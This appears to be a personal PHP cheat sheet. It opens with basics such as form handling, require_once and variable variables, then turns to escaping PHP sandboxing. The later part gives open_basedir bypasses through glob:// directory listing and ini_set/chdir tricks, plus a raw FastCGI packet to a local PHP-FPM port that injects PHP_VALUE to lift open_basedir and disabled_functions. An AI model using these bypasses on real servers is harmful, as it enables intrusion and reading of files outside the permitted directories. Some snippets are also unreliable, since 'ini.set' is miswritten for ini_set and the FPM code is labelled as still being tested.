# PHP Commands
* All of inputs in the form tag inside HTML are submitted as a dictionary with name as the dictionary key

* Check if a form has been submitted via `POST` method
```php
if (isset($_POST['submit'])){ // submitted }
```

* Get the value of a variable in the submitted form
```php
$_POST['VARIABLE']
```

* Similar syntax applies to the `GET` method, however, the `GET` variables will now be visible inside URL and added inside, separated with `&`

* `REQUEST` basically is a black box that you can use either `POST` or `GET`, and it cab have the effect of either

* To require a `PHP` file inside `HTML`
```php
<?php require_once 'index.php' ?>
```

* `${}` is the value of the referenced variable.
```php
$name = "Cat";          // name => "Cat";
${$name} = "Dog";       // name => "Cat"; $Cat => "Dog";
${${$name}} = "Monkey"; // name => "Cat"; $Cat => "Dog"; $Dog => "Monkey";
```

* Shows a file content
```php
highlight_file("index.php");
```

* Bypass `open_basedir` via glob wrapper, this leads to directory listing of `/`, root directory
```php
foreach(new DirectoryIterator("glob:///*") as $f) echo "$f\n";
foreach(new DirectoryIterator("glob:///tm?/*") as $f) echo "$f\n"; // getting file listing under /tmp/
foreach(new GlobIterator("/*") as $f) echo "$f\n";
```

* Bypass `open_basedir` by changing the `open_basedir` with `ini_set`, IF THIS IS NOT DISABLED
```php
ini.set('open_basedir', '..');
chdir(".."); chdir(".."); chdir("..");
ini.set('open_basedir', '/');
```

* Trying to bypass `disabled_functions` and `open_basedir` using `fpm`, still testing
```
$params = array(); $params['SCRIPT_NAME'] = $_SERVER['SCRIPT_NAME']; $params['SCRIPT_FILENAME'] = $_SERVER['SCRIPT_FILENAME']; $params['REQUEST_METHOD'] = 'GET'; $params['QUERY_STRING'] = 'stop=true'; $params['PHP_VALUE'] = 'open_basedir=/'; $params_encoded = ''; print_r($params); foreach ($params as $k=>$v) { $params_encoded.= chr(strlen($k)).chr(strlen($v)).$k.$v; } $len = strlen($params_encoded); $len_encoded = chr($len >> 8).chr($len & 255);
$fp = fsockopen('127.0.0.1',19260); fwrite($fp, "\x01\x01\x00\x01\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"); fwrite($fp, "\x01\x04\x00\x01".$len_encoded."\x00\x00".$params_encoded); fwrite($fp, "\x01\x04\x00\x01\x00\x00\x00\x00"); fwrite($fp, "\x01\x05\x00\x01\x00\x00\x00\x00"); sleep(2); $result = ''; while (!feof($fp)) { $result .= fread($fp, 1024); } fclose($fp); $matches = array(); preg_match('/START.*END/s', $result, $matches); echo $matches[0];
```

